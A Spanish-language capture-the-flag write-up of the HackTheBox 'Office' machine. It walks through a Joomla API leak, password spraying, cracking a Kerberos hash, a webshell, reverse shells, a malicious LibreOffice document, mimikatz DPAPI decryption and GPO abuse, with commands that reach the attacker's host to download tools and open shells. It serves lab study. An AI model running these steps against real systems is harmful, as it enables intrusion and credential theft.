@@ -1,0 +1,598 @@
+---
+title: "Máquina Office"
+description: "Resolución de la máquina Office de HackTheBox"
+categories: ["HackTheBox", "Hard" , "Windows"]
+tags: ["CVE-2023-2255", "User bruteforce", "Network Traffic analysis", "CVE-2023-2255", "Windows Credentials", "GPO Abuse"]
+logo: "/assets/writeups/office/logo.webp"
+---
+
+Hay un blog web creado en Joomla que es vulnerable a un muy conocido CVE de dicho CMS, lo usaremos para extraer una contraseña de un usuario que tiene acceso a un share con una capture de red pcap, en esa captura se encuentra un packet de pre-autenticación de Kerberos con una parte que podremos utilizar para crackear la contraseña de otro usuario que tiene permisos administrativos en el Joomla. Después de ganar acceso a la máquina escalaremos privilegios abusando de cosas internas de la máquina.
+
+## Reconocimiento
+
+La máquina tiene unos cuantos puertos abiertos. Típicos de un AD.
+
+```bash
+# Nmap 7.94 scan initiated Mon Feb 19 14:43:39 2024 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 300 -vvv 10.129.192.123
+Nmap scan report for 10.129.192.123
+Host is up, received user-set (0.24s latency).
+Scanned at 2024-02-19 14:43:39 -04 for 440s
+Not shown: 65516 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+443/tcp   open  https            syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+49681/tcp open  unknown          syn-ack ttl 127
+52744/tcp open  unknown          syn-ack ttl 127
+58447/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Mon Feb 19 14:50:59 2024 -- 1 IP address (1 host up) scanned in 439.39 seconds
+```
+
+El sitio web parece ser de una compañía que crea hologramas y artefactos tecnológicos de última generación como el Iron ManMark
+
+![Iron Man](/assets/writeups/office/1.png)
+
+Según, el CEO de esto es Tony Stark y la compañía se llama "Holographic Industries". Podemos encontrar información sobre sus proyectos y avances a través de los diferentes posts pero nada que nos sea a nosotros de interés, pero por piezas del código HTML podemos ver que el blog está hecho con el CMS Joomla.
+
+Fuera de eso, no hay mucho que hacer fuera de la web. No podemos acceder como invitados a varias cosas del servidor Windows y no hay ningún recurso SMB al que tengamos acceso.
+
+## Intrusión
+
+### dwolfe
+
+Hace unos meses, encontraron una forma de bypassear la autenticación de Joomla:
+
+> #### CVE-2023-23752
+>
+> *An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.*
+
+En GitHub podemos encontrar varios PoCs en Python, inspecionando el código de uno podemos ver que simplemente es hacer una petición GET a cualquier endpoint de la API y establecer el parámetro `public` en `true` y el sitio en cuestión nos dejará ver información. Podemos acceder a varios endpoints como `/api/index.php/v1/users` para ver usuarios, pero nos interesa más uno que nos permite ver la configuración como lo es `/api/index.php/v1/config/application`. Vamos a asumir que este Joomla es vulnerable e intentar, por qué no?
+
+Como mencioné, con solamente hacer una petición al endpoint con este parámetro ya podremos ver cosas
+
+```bash
+❯ curl -v http://10.10.11.3/api/index.php/v1/config/application\?public\=true
+*   Trying 10.10.11.3:80...
+* Connected to 10.10.11.3 (10.10.11.3) port 80
+> GET /api/index.php/v1/config/application?public=true HTTP/1.1
+> Host: 10.10.11.3
+> User-Agent: curl/8.7.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Wed, 26 Jun 2024 02:16:28 GMT
+< Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+< X-Powered-By: JoomlaAPI/1.0
+< x-frame-options: SAMEORIGIN
+< referrer-policy: strict-origin-when-cross-origin
+< cross-origin-opener-policy: same-origin
+< Expires: Wed, 17 Aug 2005 00:00:00 GMT
+< Last-Modified: Wed, 26 Jun 2024 02:16:28 GMT
+< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+< Pragma: no-cache
+< Content-Length: 2007
+< Content-Type: application/vnd.api+json; charset=utf-8
+< 
+{"links":{"self":"http:\/\/10.10.11.3\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/10.10.11.3\/api\/index.php\/v1\/config\/application? ... [snip]
+```
+
+Entre estos datos JSON, están los ajustes de la base de datos. Es un MySQL y las credenciales de conexión son `root:H0lOgrams4reTakIng0Ver754!`.
+
+Vale, tenemos una contraseña, pero... aún no sabemos en que usuario podemos probarla, porque en el blog no parece haber nada interesante, por lo que nos va a tocar hacer fuerza bruta con esta credencial. Podemos utilizar kerbrute para buscar usuarios válidos por Kerberos:
+
+```bash
+❯ kerbrute userenum --dc 10.10.11.3 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 06/25/24 - Ronnie Flathers @ropnop
+
+2024/06/25 14:21:12 >  Using KDC(s):
+2024/06/25 14:21:12 >  	10.10.11.3:88
+
+2024/06/25 14:23:11 >  [+] VALID USERNAME:	administrator@office.htb
+
+2024/06/25 14:33:17 >  [+] VALID USERNAME:	Administrator@office.htb
+2024/06/25 14:38:36 >  [+] VALID USERNAME:	ewhite@office.htb
+2024/06/25 14:38:36 >  [+] VALID USERNAME:	etower@office.htb
+2024/06/25 14:38:37 >  [+] VALID USERNAME:	dwolfe@office.htb
+2024/06/25 14:38:38 >  [+] VALID USERNAME:	dlanor@office.htb
+2024/06/25 14:38:38 >  [+] VALID USERNAME:	dmichael@office.htb
+```
+
+Nos armamos una lista, y probando esta lista de usuarios...
+
+```bash
+❯ nxc smb 10.10.11.3 -u list.txt -p 'H0lOgrams4reTakIng0Ver754!'
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+```
+
+### tstark ^ web_account
+
+dwolfe puede ver un recurso compartido al que antes no teníamos acceso
+
+```bash
+❯ nxc smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SMB         10.10.11.3      445    DC               [*] Enumerated shares
+SMB         10.10.11.3      445    DC               Share           Permissions     Remark
+SMB         10.10.11.3      445    DC               -----           -----------     ------
+SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.3      445    DC               C$                              Default share
+SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.3      445    DC               SOC Analysis    READ            
+SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share 
+```
+
+Supuestamente de analisis para el SOC, contiene una simple captura pcap
+
+```bash
+❯ smbclient -U 'dwolfe%H0lOgrams4reTakIng0Ver754!' "//10.10.11.3/SOC Analysis"
+Cant load /etc/samba/smb.conf - run testparm to debug it
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed May 10 14:52:24 2023
+  ..                                DHS        0  Wed Feb 14 06:18:31 2024
+  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 20:59:00 2023
+
+		6265599 blocks of size 4096. 1227471 blocks available
+```
+
+Al descargarla a nuestro equipo y abrirla en un software como Wireshark, podemos apreciar que se trata de una captura de tráfico que se hizo en la red corporativa de este controlador de dominio.
+
+![Capture](/assets/writeups/office/2.png)
+
+Analizando los packets, vemos que al principio no hay nada interesante, pero si filtramos por ejemplo, packets de Kerberos encontraremos una autenticación:
+
+![AS-REQ](/assets/writeups/office/3.png)
+
+Hay dos packets, y uno de ellos tiene un campo interesante
+
+![AS-REQ with PAC data](/assets/writeups/office/4.png)
+
+> El PA (Privileged Attribute) contiene información del usuario y sus privilegios, está encriptado con la contraseña del usuario.
+{: .prompt-info }
+
+Lo último nos interesa, y si hayamos como pasarlo a un formato legible por Hashcat o John tendremos menos complicaciones, afortunadamente buscando en internet [podemos encontrar](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/) un blog que explica muy bien esto. Con solamente ponerlo en este formato:
+
+`$krb5pa$18$<username>$<domain>$<pa-data>`
+
+Podemos crackearlo con Hashcat, y en efecto:
+
+```bash
+$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
+Hash.Target......: $krb5pa$18$tstark$office.htb$a16f4806da05760af63c56...86f5fc
+Time.Started.....: Tue Jun 25 15:28:01 2024 (1 sec)
+Time.Estimated...: Tue Jun 25 15:28:02 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     5107 H/s (11.58ms) @ Accel:256 Loops:256 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 5120/14344384 (0.04%)
+Rejected.........: 0/5120 (0.00%)
+Restore.Point....: 4096/14344384 (0.03%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3840-4095
+Candidate.Engine.: Device Generator
+Candidates.#1....: newzealand -> allison1
+Hardware.Mon.#1..: Temp: 76c Util: 96%
+
+Started: Tue Jun 25 15:27:37 2024
+Stopped: Tue Jun 25 15:28:03 2024
+```
+
+Intentando acceder con esta contraseña al Joomla como Administrador, nos deja:
+
+![Joomla admin](/assets/writeups/office/5.png)
+
+Ahora simplemente podemos poner una webshell en uno de los ficheros de la plantilla de la página y obtener acceso a la máquina.
+
+![PHP Shell](/assets/writeups/office/6.png)
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.3 60162
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\xampp\htdocs\joomla>
+```
+
+Ya que conocemos la contraseña de otro usuario, podemos utilizar RunasCs para convertirnos en el.
+
+```bash
+PS C:\Temp> .\runas.exe tstark 'playboy69' "powershell" -r 10.10.14.150:8443
+[*] Warning: The logon for user 'tstark' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-a75c2$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 8068 created in background.
+```
+
+```bash
+❯ rlwrap nc -lvnp 8443
+Listening on 0.0.0.0 8443
+Connection received on 10.10.11.3 60222
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32>
+```
+
+Tony Stark tiene la primera flag en su escritorio, por lo que ya podemos recogerla.
+
+```bat
+PS C:\Users\tstark> cd Desktop
+cd Desktop
+PS C:\Users\tstark\Desktop> dir
+dir
+
+
+    Directory: C:\Users\tstark\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-ar---         6/25/2024  11:02 AM             34 user.txt                                                             
+
+
+PS C:\Users\tstark\Desktop> type user.txt
+type user.txt
+9829c0e2a61fb364fca24c55b9******
+```
+
+## Escalada de privilegios
+
+### ppotts
+
+En la carpeta del XAMPP, hay un sitio que no habíamos visto antes:
+
+```bat
+PS C:\xampp\htdocs> dir
+dir
+
+
+    Directory: C:\xampp\htdocs
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----          5/9/2023   7:53 AM                administrator                                                        
+d-----         1/30/2024   8:39 AM                internal                                                             
+d-----          5/8/2023   3:10 PM                joomla                                                               
+```
+
+Indagando por su contenido, parece ser un aplicativo interno para aplicar a un trabajo y está esperando un documento... asumiremos que un documento de tipo `.doc` o `.odt`. Pero utilizaremos `.odt` ya que la máquina tiene instalado el suite LibreOffice
+
+```bat
+PS C:\xampp\htdocs\internal> ls -Force "C:\Program Files"
+ls -Force "C:\Program Files"
+
+
+    Directory: C:\Program Files
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         1/22/2024   9:58 AM                Common Files                                                         
+d-----         1/25/2024  12:20 PM                Internet Explorer                                                    
+d-----         1/17/2024   1:26 PM                LibreOffice 5                                                        
+d-----          5/2/2023   5:22 PM                Microsoft OneDrive                                                   
+d-----          5/8/2021   1:20 AM                ModifiableWindowsApps                                                
+d-----         4/14/2023   3:22 PM                Npcap                                                                
+d-----         4/12/2023   4:30 PM                Oracle                                                               
+d--h--         4/12/2023   4:08 PM                Uninstall Information                                                
+d-----         2/14/2024   2:18 AM                VMware                                                               
+d-----         4/17/2023   3:35 PM                Windows Defender                                                     
+d-----         1/25/2024  12:20 PM                Windows Defender Advanced Threat Protection                          
+d-----         1/25/2024  12:20 PM                Windows Mail                                                         
+d-----         1/25/2024  12:20 PM                Windows Media Player                                                 
+d-----          5/8/2021   2:35 AM                Windows NT                                                           
+d-----          3/2/2022   7:58 PM                Windows Photo Viewer                                                 
+d--hs-          5/8/2021   1:34 AM                Windows Sidebar                                                      
+d--h--         1/18/2024  12:31 PM                WindowsApps                                                          
+d-----          5/8/2021   1:34 AM                WindowsPowerShell                                                    
+d-----         4/14/2023   3:23 PM                Wireshark                                                            
+-a-hs-          5/8/2021   1:18 AM            174 desktop.ini  
+```
+
+> **CVE-2023-2255**
+>
+> Improper access control in editor components of The Document Foundation LibreOffice allowed an attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used "floating frames" linked to external files, would load the contents of those frames without prompting the user for permission to do so. This was inconsistent with the treatment of other linked content in LibreOffice. This issue affects: The Document Foundation LibreOffice 7.4 versions prior to 7.4.7; 7.5 versions prior to 7.5.3.
+
+Viendo que la versión parece ser antigua indagando entre los archivos, podemos abusar del `CVE-2023-2255` para intentar obtener una consola en nombre de quien esté revisando estas aplicaciones de trabajo. Lo haremos con el usuario `web_account` ya que es quien tiene permisos para editar la carpeta.
+
+```bat
+PS C:\xampp\htdocs\internal\applications> curl -o application.odt http://10.10.14.150:8000/output.odt
+```
+
+```bat
+❯ rlwrap nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.3 60638
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Program Files\LibreOffice 5\program>whoami
+whoami
+office\ppotts
+
+```
+
+### hhogan
+
+Tenemos una credencial guardada
+
+```bat
+C:\Program Files\LibreOffice 5\program>cmdkey /l
+cmdkey /l
+
+Currently stored credentials:
+
+    Target: LegacyGeneric:target=MyTarget
+    Type: Generic 
+    User: MyUser
+    
+    Target: Domain:interactive=office\hhogan
+    Type: Domain Password
+    User: office\hhogan 
+```
+
+Este usuario está en dos grupos interesantes
+
+```bat
+User name                    HHogan
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers         
+The command completed successfully.
+```
+
+Podemos conectarnos con WinRM utilizando este usuario y además es parte del grupo GPO Managers, por lo que podemos manejar políticas de grupo como la que está establecida por defecto para poder escalar privilegios en el dominio. Vamos a hacer uso de mimikatz para obtener estas credenciales ya que por defecto están encriptadas por DPAPI y almacenadas en `%USERPROFILE%\AppData\Roaming\Microsoft\Credentials\<ID>`, pero podemos aprovecharnos de cierta funcionalidad RPC para llegar a desencriptarlas.
+
+```bat
+PS C:\Users\PPotts\Documents> curl -o mimikatz.exe http://10.10.14.150:8000/mimikatz.exe
+PS C:\Users\PPotts\Documents> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz #
+```
+
+Okay, miremos el directorio que mencioné arriba:
+
+```bat
+PS C:\Users\PPotts\Documents> ls -Force ~\AppData\Roaming\Microsoft\Credentials
+
+
+    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
+-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
+-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
+```
+
+La que tiene fecha de modificación más reciente debe ser, ahora necesitamos un segundo directorio que está almacenado en `%APPDATA%\Microsoft\Protect\<SID del usuario>`, y es el que contiene un componente que nos permitirá encontrar la masterkey para desencriptar esto, buscando en la carpeta podremos encontrar unos cuantos:
+
+```bat
+PS C:\Users\PPotts\Documents> ls -Force ~\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+
+
+    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d  <-----
+-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
+-a-hs-         6/25/2024  11:02 AM            740 1b82834b-da1f-4c60-8dcb-050ba331942d
+-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
+-a-hs-         6/25/2024  11:02 AM             24 Preferred
+```
+
+El que tiene una fecha de modificación similar al que encontramos arriba debe ser, vamos a utilizarlo para obtener nuestra masterkey de la DPAPI y posteriormente leer las credenciales en texto claro.
+
+```bat
+mimikatz # dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-977e5-9bef8471fc7d /rpc
+... [snip]
+Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
+
+[domainkey] with RPC
+[DC] 'office.htb' will be the domain
+[DC] 'DC.office.htb' will be the DC server
+  key : 3f891c81971ccacb02123a9dde170eaae918026ccc0a305b221d3582de4add84c900ae79f950132e4a70b0ef49dea6907b4f319c5dd10f60cc31cb1e3bc33024
+  sha1: fbab11cacdd8407e8db9604f0f8c92178bee6fd3
+mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\E76CCA3670CD9BB98DF79E0A8D176F1E /masterkey: ... [snip] ...
+...
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000a6 - 166
+  credUnk0       : 00002004 - 8196
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 1/18/2024 7:53:30 PM
+  unkFlagsOrSize : 00000000 - 0
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive=office\hhogan
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : office\hhogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+```
+
+### Administrador
+
+Este usuario tiene acceso a WinRM como pudimos ver anteriormente
+
+```bash
+❯ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\HHogan\Documents>
+```
+
+También vimos que es parte del grupo de `GPO Managers`, por lo que podemos editar políticas de grupo para darnos permisos administrativos. Yo para hacer esto sencillo utilizaré [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)
+
+Hay varias GPO acá. Tomaremos la por defecto del dominio.
+
+```bash
+*Evil-WinRM* PS C:\Users\HHogan\Documents> Get-Gpo -All | Select-Object DisplayName
+
+DisplayName
+-----------
+Windows Firewall GPO
+Default Domain Policy
+Default Active Directory Settings GPO
+Default Domain Controllers Policy
+Windows Update GPO
+Windows Update Domain Policy
+Software Installation GPO
+Password Policy GPO
+```
+
+Ejecutando el script que descargamos antes, le daremos un comando que nos asignará al grupo local de administradores luego de refrescar las políticas de grupo con un `gpupdate`:
+
+```bash
+❯ python pygpoabuse.py -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' -f -k -ccache hhogan.ccache -dc-ip dc.office.htb -command "net localgroup Administrators hhogan /add" office.htb/hhogan
+SUCCESS:root:ScheduledTask TASK_5f6e3592 created!
+[+] ScheduledTask TASK_5f6e3592 created!
+```
+
+> Notar que tuve que utilizar autenticación Kerberos para el script, ya que parece estar mal programado para hacerlo por NTLM.
+{: .prompt-info }
+
+```bash
+*Evil-WinRM* PS C:\Users\HHogan\Documents> gpupdate
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+
+*Evil-WinRM* PS C:\Users\HHogan\Documents> net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   6/26/2024 12:47:46 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+```
+
+Vamos a tener que iniciar una nueva sesión para tener el nuevo grupo aplicado totalmente. Una vez hecho, ya podremos tomar la última flag.
+
+```bash
+*Evil-WinRM* PS C:\Users\HHogan\Documents> cd C:\Users\Administrator
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         6/25/2024  11:02 AM             34 root.txt
+
+
+type r*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+31bc7176211b6314bdb83134c8******
+```
+
+## Extra
+
+Un punto que no me gustó de la máquina es que el Apache a veces tardaba más de lo normal en procesar las peticiones HTTP, o al menos eso experimenté yo en sus primeros días en el release arena.
+
+También debo decir que estuvo divertido colocar el sitio de la máquina haciendo referencia a las películas de Iron Man.
